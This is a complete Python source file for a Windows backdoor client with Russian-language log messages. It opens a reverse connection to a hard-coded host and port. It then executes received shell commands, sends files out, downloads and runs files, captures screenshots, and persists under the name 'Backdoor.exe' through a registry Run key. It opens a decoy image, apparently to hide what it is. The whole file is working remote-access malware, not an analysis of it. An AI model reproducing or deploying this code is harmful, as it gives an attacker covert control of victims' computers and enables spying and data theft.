#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import winreg
import base64
import requests
from mss import mss
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
    filename="client_log.txt",
    filemode="a",
)


def reliable_send(data, sock):
    try:
        json_data = json.dumps(data).encode()
        sock.send(json_data)
        logging.info(f"Отправлено: {data}")
    except Exception as e:
        logging.error(f"Ошибка при отправке данных: {e}")


def reliable_recv(sock):
    json_data = b""
    while True:
        try:
            json_data += sock.recv(1024)
            result = json.loads(json_data.decode())
            logging.info(f"Получено: {result}")
            return result
        except ValueError:
            continue


def is_admin(sock):
    try:
        temp_dir = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "temp")
        os.listdir(temp_dir)
        admin = "[!!] Administrator Privileges"
    except PermissionError:
        admin = "[!!] User Privileges"
    except Exception as e:
        admin = f"[!!] Ошибка при проверке привилегий: {e}"
    reliable_send(admin, sock)


def download(url):
    try:
        get_response = requests.get(url, timeout=10)
        file_name = url.split("/")[-1]
        with open(file_name, "wb") as out_file:
            out_file.write(get_response.content)
        logging.info(f"[+] Файл {file_name} успешно скачан!")
        return f"[+] Файл {file_name} успешно скачан!"
    except Exception as e:
        logging.error(f"[!!] Ошибка скачивания файла: {e}")
        return f"[!!] Ошибка скачивания файла: {e}"


def screenshot():
    try:
        with mss() as sct:
            screenshot_file = sct.shot(output="screenshot.png")
        with open(screenshot_file, "rb") as screen_file:
            logging.info("[+] Скриншот успешно создан")
            return base64.b64encode(screen_file.read())
    finally:
        if os.path.exists("screenshot.png"):
            os.remove("screenshot.png")


def upload(sock, file_name):
    try:
        with open(file_name, "rb") as file:
            file_data = base64.b64encode(file.read()).decode
            reliable_send(file_data, sock)
        reliable_send("[+] Файл успешно отправлен", sock)
        logging.info(f"[+] Файл {file_name} успешно отправлен")
    except FileNotFoundError:
        reliable_send("[!!] Файл не найден", sock)
        logging.error(f"[!!] Файл {file_name} не найден")
    except Exception as e:
        reliable_send(f"[!!] Ошибка: {e}", sock)
        logging.error(f"[!!] Ошибка при отправке файла {file_name}: {e}")


def save_file(sock, file_name):
    try:
        with open(file_name, "wb") as file:
            file_data = reliable_recv(sock)
            file.write(base64.b64decode(file_data))
        reliable_send("[+] Файл успешно загружен", sock)
        logging.info(f"[+] Файл {file_name} успешно загружен")
    except Exception as e:
        reliable_send(f"[!!] Ошибка загрузки файла: {e}", sock)
        logging.error(f"[!!] Ошибка загрузки файла {file_name}: {e}")


def execute_command(sock, command):
    try:
        proc = subprocess.Popen(
            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        result = proc.stdout.read() + proc.stderr.read()
        reliable_send(result.decode(errors="ignore"), sock)
        logging.info(f"[+] Выполнена команда: {command}")
    except Exception as e:
        reliable_send(f"[!!] Ошибка выполнения команды: {e}", sock)
        logging.error(f"[!!] Ошибка выполнения команды {command}: {e}")


def shell(sock):
    while True:
        try:
            command = reliable_recv(sock)
            if command == "q":
                logging.info("[+] Клиент закрыт")
                sock.close()
                sys.exit(0)

            elif command.startswith("cd"):
                try:
                    os.chdir(command[3:])
                    reliable_send(f"[+] Переход в директорию: {os.getcwd()}", sock)
                except Exception as e:
                    reliable_send(f"[!!] Ошибка: {e}", sock)
            elif command.startswith("download"):
                upload(sock, command[9:])
            elif command.startswith("upload"):
                save_file(sock, command[7:])
            elif command.startswith("get"):
                result = download(command[4:])
                reliable_send(result, sock)
            elif command.startswith("start"):
                try:
                    subprocess.Popen(command[6:], shell=True)
                    reliable_send(f"[+] Файл {command[6:]} успешно запущен", sock)
                except Exception as e:
                    reliable_send(f"[!!] Ошибка запуска файла: {e}", sock)
            elif command.startswith("screenshot"):
                screenshot_data = screenshot()
                reliable_send(screenshot_data.decode(), sock)
            elif command.startswith("check"):
                is_admin(sock)
            else:
                execute_command(sock, command)
        except Exception as e:
            logging.error(f"[!!] Ошибка в shell: {e}")
            break


def connection():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("192.168.178.67", 54321))
            logging.info("[+] Успешное подключение к серверу")
            shell(sock)
        except socket.error as e:
            logging.error(f"[!!] Ошибка подключения: {e}")
            time.sleep(5)
        except Exception as e:
            logging.error(f"[!!] Ошибка в connection: {e}")
            break


def setup_autorun():
    location = os.environ["APPDATA"] + "\\Backdoor.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            ) as key:
                winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
        except Exception as e:
            logging.error(f"[!!] Ошибка записи в реестр: {e}")
        try:
            if hasattr(sys, "_MEIPASS"):
                image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
            else:
                image_path = os.path.join(os.getcwd(), "aaa.jpg")
            if os.path.exists(image_path):
                subprocess.Popen(["start", image_path], shell=True)
                logging.info("[+] Картинка открыта при запуске")
        except:
            logging.error(f"[!!] Ошибка открытия картинки: {e}")


if __name__ == "__main__":
    setup_autorun()
    connection()
